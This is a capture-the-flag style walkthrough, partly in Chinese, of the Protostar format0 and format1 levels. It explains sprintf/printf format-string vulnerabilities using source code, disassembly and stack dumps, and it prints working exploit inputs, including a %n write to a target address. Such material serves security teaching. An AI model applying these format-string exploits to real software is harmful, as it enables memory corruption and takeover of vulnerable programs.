# Format

## Format

### About

This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.

**Hints**

* This level should be done in less than 10 bytes of input.
* “Exploiting format string vulnerabilities”

This level is at /opt/protostar/bin/format0

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);

  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

`sprintf`指的是**字符串格式化命令**，主要功能是**把格式化的数据写入某个字符串中**。`sprintf` 是个[变参](https://baike.baidu.com/item/变参/9844833)函数。使用`sprintf` 对于写入`buffer`的字符数是**没有限制**的，这就存在了`buffer`溢出的可能性。

用objdump查看一下汇编代码，`target`变量在`ebp-0xc`处，`buffer`在`ebp-0x4c`处，二者相距`0x40`（64个字节），所以通过格式化字符串，**写入64个字符（从栈中格式化字符串的后面取值），后面跟上0xdeadbeef**，就能将`target`的值覆盖成`0xdeadbeef`。

```javascript
080483f4 <vuln>:
 80483f4:    55                       push   ebp
 80483f5:    89 e5                    mov    ebp,esp
 80483f7:    83 ec 68                 sub    esp,0x68
 80483fa:    c7 45 f4 00 00 00 00     mov    DWORD PTR [ebp-0xc],0x0
 8048401:    8b 45 08                 mov    eax,DWORD PTR [ebp+0x8]
 8048404:    89 44 24 04              mov    DWORD PTR [esp+0x4],eax
 8048408:    8d 45 b4                 lea    eax,[ebp-0x4c]
 804840b:    89 04 24                 mov    DWORD PTR [esp],eax
 804840e:    e8 ed fe ff ff           call   8048300 <sprintf@plt>
 8048413:    8b 45 f4                 mov    eax,DWORD PTR [ebp-0xc]
 8048416:    3d ef be ad de           cmp    eax,0xdeadbeef
 804841b:    75 0c                    jne    8048429 <vuln+0x35>
 804841d:    c7 04 24 10 85 04 08     mov    DWORD PTR [esp],0x8048510
 8048424:    e8 07 ff ff ff           call   8048330 <puts@plt>
 8048429:    c9                       leave
 804842a:    c3                       ret
```

你可以写入`64个A`或者其他的，或者可以通过`%64c`写入64个字符，后面在加上`deadbeef`。**$\(\)**是用来做**命令替换**的，先执行`$()`里面的命令，得到返回结果进行替换。

### Exp

```bash
user@protostar:/opt/protostar/bin$ ./format0 $(echo -en "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde")
you have hit the target correctly :)

user@protostar:/opt/protostar/bin$ ./format0 $(echo -en "%64c\xef\xbe\xad\xde")
you have hit the target correctly :)
```

## Format1

### About

This level shows how format strings can be used to modify arbitrary memory locations.

**Hints**

* objdump -t is your friend, and your input string lies far up the stack :\)

This level is at /opt/protostar/bin/format1

### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);

  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

解决方案如下：我们确定目标变量的地址。我们以格式字符串传递此地址。格式字符串实际上是一个参数，将保存在堆栈中。然后，我们确定地址在堆栈中的位置，并使用`％k\$n`\(应该是%k$n的形式，但是由于输出的时候可以被转义，所以加上一个"\"\)，其中k是数字。

首先通过`objdump`查看符号表，可以看到target的地址是`0x8049638`，处于`bss段`。

```text
$ objdump -t format1
080483f4 g     F .text    00000028              vuln
08049638 g     O .bss    00000004              target
0804963c g       *ABS*    00000000              _end
00000000       F *UND*    00000000              puts@@GLIBC_2.0
08049630 g       *ABS*    00000000              _edata
080484aa g     F .text    00000000              .hidden __i686.get_pc_thunk.bx
0804841c g     F .text    0000001b              main
080482c0 g     F .init    00000000              _init
```

我们通过%p（以地址形式显示）打印栈中的内容。我们在后面发现了有`0x41414141`，`0x41`就是'`A`'的ascii值。

```text
$ user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print('AAAAAAAA' + '%p-' * 150)")
AAAAAAAA0x804960c-0xbffff5d8-0x8048469-0xb7fd8304-0xb7fd7ff4-0xbffff5d8-0x8048435-0xbffff7b7-0xb7ff1040-0x804845b-0xb7fd7ff4-0x8048450-(nil)-0xbffff658-0xb7eadc76-0x2-0xbffff684-0xbffff690-0xb7fe1848-0xbffff640-0xffffffff-0xb7ffeff4-0x804824d-0x1-0xbffff640-0xb7ff0626-0xb7fffab0-0xb7fe1b28-0xb7fd7ff4-(nil)-(nil)-0xbffff658-0x90bcfb24-0xbaef4d34-(nil)-(nil)-(nil)-0x2-0x8048340-(nil)-0xb7ff6210-0xb7eadb9b-0xb7ffeff4-0x2-0x8048340-(nil)-0x8048361-0x804841c-0x2-0xbffff684-0x8048450-0x8048440-0xb7ff1040-0xbffff67c-0xb7fff8f8-0x2-0xbffff7ad-0xbffff7b7-(nil)-0xbffff982-0xbffff990-0xbffff9a4-0xbffff9c6-0xbffff9d9-0xbffff9e3-0xbffffed3-0xbfffff11-0xbfffff25-0xbfffff3c-0xbfffff4d-0xbfffff55-0xbfffff65-0xbfffff80-0xbfffff8d-0xbfffffc1-0xbfffffd4-0xbfffffe0-(nil)-0x20-0xb7fe2414-0x21-0xb7fe2000-0x10-0x178bfbbf-0x6-0x1000-0x11-0x64-0x3-0x8048034-0x4-0x20-0x5-0x7-0x7-0xb7fe3000-0x8-(nil)-0x9-0x8048340-0xb-0x3e9-0xc-(nil)-0xd-0x3e9-0xe-0x3e9-0x17-0x1-0x19-0xbffff78b-0x1f-0xbffffff2-0xf-0xbffff79b-(nil)-(nil)-(nil)-(nil)-(nil)-0x80000000-0x9dc2ee44-0x412db7ab-0xbe1a1728-0x694ebebc-0x363836-(nil)-(nil)-(nil)-0x662f2e00-0x616d726f-0x41003174-0x41414141-0x25414141-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-
```

通过多次尝试，我们找的了`BBBB`的对应位置，我们需要在`BBBB`填入`target的地址`，然后用`%n`将改地址写入内容。

`%k$x`表示要泄漏偏移k处4字节长的16进制数据，比如我输入`AAAA%3$08x`,就可以得到位于`format参数`下面第三个数据。

### exp

```text
$ user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print('ABBBBCCC' + '%133\$p')")
ABBBBCCC0x42424242

$ user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print('ABBBBCCC' + '%133\$p')")
ABBBBCCC0x42424242user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print('A\x38\x96\x04\x08CCC' + '%133\$p')")
A8CCC0x8049638

$ user@protostar:/opt/protostar/bin$ ./format1 $(python -c "print('A\x38\x96\x04\x08CCC' + '%133\$n')")
A8CCCyou have modified the target :)
```

